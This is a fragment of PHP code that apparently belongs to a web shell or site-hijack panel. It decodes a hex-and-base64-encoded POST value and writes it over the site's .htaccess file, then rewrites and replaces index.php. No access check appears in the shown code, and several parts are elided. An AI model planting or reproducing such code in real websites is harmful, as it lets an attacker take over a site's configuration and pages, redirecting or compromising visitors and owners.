...
if(isset($_POST['ht'])){
$ht = utf8togbk(base64_decode(hex2str($_POST['ht']))); 
//echo $ht;
if(file_exists('.htaccess')){
rename('.htaccess',date('YmdHis').'-.htaccess');
}
file_put_contents('.htaccess',$ht);
}
## 修改INDEX.PHP
...
$index = str_replace('<textarea','<xtextarea',$index);
$index = str_replace('</textarea','</xtextarea',$index);
$var_name = array(
array('内容','index'),
);
...
$index = str_replace('<xtextarea','<textarea',$index);
$index = str_replace('</xtextarea','</textarea',$index); 
//echo $index;
if(file_exists('index.php')){
rename('index.php',date('YmdHis').'-index.php.bak');
}
